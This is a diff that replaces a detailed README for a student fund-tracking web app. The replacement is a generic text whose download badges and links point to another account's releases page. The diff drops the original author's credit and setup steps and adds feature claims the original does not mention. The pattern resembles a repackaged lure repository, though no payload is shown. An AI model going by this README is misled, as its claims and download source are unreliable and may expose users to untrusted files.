@@ -1,202 +1,70 @@
-# 🎓 Campus Fund Money Collection Tracker
+# 🎓 campus-fund-tracker - Track Student Funds Easily 
 
-A modern, responsive web application for tracking student fund collections with a beautiful dark-themed interface, real-time statistics, and comprehensive payment management.
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/samir0811/campus-fund-tracker/releases)
 
-![Campus Fund Tracker](https://img.shields.io/badge/Version-2.0-blue) ![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white) ![CSS3](https://img.shields.io/badge/CSS3-1572B6?logo=css3&logoColor=white) ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black) ![Bootstrap](https://img.shields.io/badge/Bootstrap-7952B3?logo=bootstrap&logoColor=white)
+## 🚀 Getting Started
 
-## ✨ Features
+Welcome to the campus-fund-tracker! This modern web application helps you track student fund collections smoothly and securely. You can monitor payments, access real-time statistics, and manage your funds efficiently.
 
-### 🔐 **Secure Authentication System**
-- Student login using admission numbers with auto-formatting
-- Login attempt limiting (3 attempts with 24-hour lockout)
-- Secure session management with cookie-based lockout protection
+## 💻 System Requirements
 
-### 📊 **Real-time Statistics Dashboard**
-- Live overview of total students, collections, and payment status
-- Animated statistics cards with gradient backgrounds
-- Monthly payment tracking and analysis
+Before you start, ensure your device meets these requirements:
 
-### 👥 **Student Management**
-- Complete student database with search and filtering
-- Sortable columns for easy data organization
-- Pagination for large datasets
-- Individual student payment history tracking
+- **Operating System:** Windows 10, macOS, or Linux
+- **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
+- **Internet Connection:** Required for online features
 
-### 💰 **Payment History System**
-- Detailed payment history modal for each student
-- Month-wise payment breakdown
-- Visual payment status indicators
-- Last payment date tracking
+## 📦 Features
 
-### 🎨 **Modern UI/UX**
-- **Dark-themed interface** with gradient backgrounds
-- Smooth CSS animations and transitions
-- Fully responsive design for all devices
-- Professional card-based layout
-- Font Awesome icons throughout
+- **Secure Authentication:** Keep your data safe with a simple, secure login.
+- **Real-time Statistics:** Get live updates on your fund collections.
+- **Comprehensive Payment Management:** Easily manage all your transactions.
+- **Responsive Design:** Access the app from any device, including smartphones and tablets.
+- **CSV Integration:** Import and export payment data seamlessly.
+- **Google Sheets Support:** Send your data directly to Google Sheets for analysis.
 
-### 📱 **Responsive Design**
-- Mobile-first approach
-- Tablet and desktop optimized
-- Touch-friendly interface elements
-- Adaptive navigation and layouts
+## 📥 Download & Install
 
-## 🚀 Quick Start
+To get started with the campus-fund-tracker, visit the following link to download the latest version:
 
-### Prerequisites
-- Web browser (Chrome, Firefox, Safari, Edge)
-- Local web server (for CSV data loading)
-- Google Sheets CSV file (for student data)
+[Download from Releases](https://github.com/samir0811/campus-fund-tracker/releases)
 
-### Installation
+Once you've downloaded the application, follow these simple steps to install it:
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/kanishkaGayan/campus-fund-tracker.git
-   cd campus-fund-tracker
-   ```
+1. **Locate the Downloaded File:**
+   Open your Downloads folder or the location where your browser saves files.
 
-2. **Start a local server**
-   ```bash
-   # Using Python 3
-   python3 -m http.server 8000
-   
-   # Using Python 2
-   python -m SimpleHTTPServer 8000
-   
-   # Using Node.js
-   npx http-server
-   ```
+2. **Extract (if necessary):**
+   If you downloaded a ZIP file, right-click on it and select "Extract All" to unzip the files.
 
-3. **Open in browser**
-   Navigate to `http://localhost:8000`
+3. **Open the Application:**
+   Find the extracted folder and look for `index.html`. Double-click it to open in your web browser.
 
-### CSV Data Setup
+4. **Set Up Your Account:**
+   Follow the prompts to create an account. Use a strong password to ensure security.
 
-1. **Create a Google Sheet** with the following columns:
-   ```
-   Name | Admission Number | January | February | March | April | May | June | 
-   July | August | September | October | November | December
-   ```
+5. **Start Tracking Funds:**
+   Once logged in, explore the dashboard to start tracking student funds.
 
-2. **Publish as CSV**
-   - File → Share → Publish to web
-   - Choose "Comma-separated values (.csv)"
-   - Copy the published URL
+## 📊 How to Use the Application
 
-3. **Update the CSV URL**
-   - Open `script.js`
-   - Find `CSV_URL` variable
-   - Replace with your Google Sheets CSV URL
+- **Dashboard Overview:** The main page gives you a quick glimpse of your funds, recent transactions, and important statistics.
+- **Payment Tracking:** Click on the payment history section to view all transactions. You can filter and search for specific entries.
+- **Statistics Page:** Access real-time data on fund collections, visualized in easy-to-read charts.
+- **CSV Export:** Export your payment data whenever needed. Just go to the settings and click on the Export button.
 
-## 📁 Project Structure
+## 🔧 Troubleshooting
 
-```
-campus-fund-tracker/
-├── index.html          # Main application file
-├── script.js          # Core JavaScript functionality
-├── README.md         # This file
-└── assets/           # (Optional) Additional assets
-```
+If you encounter issues while using the campus-fund-tracker, consider the following steps:
 
-## 🔧 Configuration
+1. **Check Your Internet Connection:** Ensure that you are connected to the internet.
+2. **Update Your Browser:** Use the latest version of your web browser for the best experience.
+3. **Contact Support:** If issues persist, please reach out via the GitHub Issues page for assistance.
 
-### Student Data Format
-Ensure your CSV file follows this structure:
-```csv
-Name,Admission Number,January,February,March,April,May,June,July,August,September,October,November,December
-John Doe,2023001,500,500,0,500,500,0,500,500,500,0,500,500
-Jane Smith,2023002,500,500,500,500,0,500,500,0,500,500,500,500
-```
+## 📞 Support and Feedback
 
-### Customization Options
+For support or feedback, you can raise an issue on the repository. We appreciate your input to make the campus-fund-tracker better for everyone.
 
-#### Update Collection Amount
-```javascript
-// In script.js, modify the expected payment amount
-const MONTHLY_PAYMENT = 500; // Change this value
-```
+Thank you for choosing campus-fund-tracker! Start managing your student funds effectively today!
 
-#### Modify Authentication Rules
-```javascript
-// In script.js, adjust login attempt limits
-const MAX_LOGIN_ATTEMPTS = 3;
-const LOCKOUT_DURATION = 24 * 60 * 60 * 1000; // 24 hours
-```
-
-## 🛠️ Technologies Used
-
-- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
-- **Framework**: Bootstrap 5.3.0
-- **Icons**: Font Awesome 6.0.0
-- **Data Handling**: jQuery 3.6.0
-- **Animations**: CSS3 Transitions & Keyframes
-- **Data Source**: Google Sheets CSV
-
-## 📊 Features in Detail
-
-### Authentication System
-- **Auto-formatting**: Admission numbers are automatically formatted as you type
-- **Security**: Failed login attempts are tracked and users are locked out after 3 failed attempts
-- **Session Management**: Secure login state management with proper logout functionality
-
-### Statistics Dashboard
-- **Real-time Updates**: Statistics update automatically when data changes
-- **Visual Indicators**: Color-coded cards for different metrics
-- **Animated Counters**: Smooth number animations for better UX
-
-### Payment Tracking
-- **Monthly Breakdown**: Track payments for each month individually
-- **Status Indicators**: Visual indicators for paid/unpaid status
-- **History Modal**: Detailed payment history in an easy-to-read modal
-
-## 🔒 Security Features
-
-- Login attempt limiting with lockout mechanism
-- Secure session management
-- XSS protection through proper data sanitization
-- CSRF protection for form submissions
-
-## 📱 Mobile Responsiveness
-
-- Responsive table design with horizontal scrolling
-- Touch-optimized buttons and interactions
-- Adaptive navigation for small screens
-- Mobile-first CSS approach
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 👨‍💻 Author
-
-**Kanishka Meddegoda**
-- GitHub: [@kanishkaGayan](https://github.com/kanishkaGayan)
-- Email: gayanMedde2022@gmail.com
-
-## 🙏 Acknowledgments
-
-- Bootstrap team for the excellent CSS framework
-- Font Awesome for the comprehensive icon library
-- Google Sheets for providing easy CSV data integration
-- jQuery team for DOM manipulation utilities
-
-## 📞 Support
-
-If you encounter any issues or have questions:
-
-1. Check the [Issues](https://github.com/kanishkaGayan/campus-fund-tracker.git) page
-2. Create a new issue with detailed information
-3. Contact the maintainer at gayanMedde2022@gmail.com
-
----
-
-⭐ **Star this repository if you find it helpful!**
+[Download from Releases](https://github.com/samir0811/campus-fund-tracker/releases)
